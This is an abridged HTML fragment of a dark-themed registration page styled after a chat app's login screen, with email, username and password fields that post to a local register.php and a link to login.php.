    ...
    <div id="app-mount" class="appMount-3lHmkl">
      ...
      <div class="app-1q1i1E">
        <div class="wrapper-6URcxg">
            ...
            <div>
              <form class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark" method="POST" action="register.php">
                <div class="centeringWrapper-2Rs1dR">
                  <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
                    <div class="mainLoginContainer-1ddwnR">
                      <h3 class="title-jXR8lp marginBottom8-AtZOdT fontDisplay-1dagSA base-1x0h_U size24-RIRrxO">Please Register Now!</h3>
                  
                      <div class="block-egJnc0 marginTop20-3TxNs6">

                      <div class="block-egJnc0 marginTop20-3TxNs6">
                        <div class="marginBottom20-32qID7">
                          <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP">Email</h5>
                           
                            <div class="inputWrapper-31_8H8">
                              <input class="inputDefault-_djjkz input-cIJ7To" name="email" type="email" placeholder="Enter your Email" aria-label="email" autocomplete="off" maxlength="999" spellcheck="false" value="email">
                            </div>
                          </div>

                        <div class="marginBottom20-32qID7">
                            <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP">Username</h5>
                           
                            <div class="inputWrapper-31_8H8">
                              <input class="inputDefault-_djjkz input-cIJ7To" name="username" type="text" placeholder="Enter your Username" aria-label="username" autocomplete="off" maxlength="999" spellcheck="false" value="text">
                            </div>
                          </div>
                          ...
                          <div class="marginBottom20-32qID7">
                            <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP">Password</h5>
                              ...
                              <div class="inputWrapper-31_8H8">
                                <input class="inputDefault-_djjkz input-cIJ7To" name="password" type="password" placeholder="Enter Password" aria-label="Password" autocomplete="off" maxlength="999" spellcheck="false" value="password">
                              </div>
                            </div>
                            </div>
                        ...
                        <button name="submit" type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
                          <div class="contents-18-Yxp">Register</div>
                        </button>
                        <div class="marginTop4-2BNfKC">
                          <span class="needAccount-23l_Wh">Already Have an Account?</span>
                          <button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                            <div class="contents-18-Yxp"> <a href="login.php">Login</a></div>
                          </button>
                        </div>
                      </div>
                    </div>
